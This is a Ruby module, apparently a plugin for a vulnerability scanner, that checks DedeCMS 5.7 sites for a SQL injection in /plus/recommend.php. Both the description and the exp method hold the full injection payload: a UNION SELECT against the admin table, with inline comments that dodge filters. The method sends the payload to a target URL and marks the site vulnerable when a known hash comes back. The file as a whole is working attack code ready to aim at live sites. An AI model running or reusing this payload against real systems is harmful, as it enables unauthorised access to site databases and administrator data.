# encoding: utf-8

require 'net/http'
require 'uri'

class Exploit_4 < Playload::Issue

    def initialize
    	@name 			= "Dedecms5.7 SQL"
        @type			= "dedecms"
        @tags 			= "dedecms"
        @description	= %q{Dedecms5.7 recommend.php sql injection Exp: /plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27and+char(@%60%27%60)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(0x40776562736166657363616E40),5,6,7,8,9%20from%20%60%23@__admin%60%23}
        @references		= {'sebug' => 'http://sebug.net/vuldb/ssvid-61660'}
        @severity 		= :high
        @remedy_guidance = "SQL过滤"
        @is_found 		= false
        @is_error 		= false
    end

    def exp(url)
        begin
            uri = URI(url + '/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27and+char(@%60%27%60)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(0x40776562736166657363616E40),5,6,7,8,9%20from%20%60%23@__admin%60%23')
            response = Net::HTTP.get_response(uri)
            if response.body.include?('2e0e20673083dea5cc87a85d54022049') then
      	  		@is_found = true
            end 
        rescue
            puts "Send Exp Failed: #{$!}"
        end 
    end

end

Playload::Queue.add Exploit_4.new
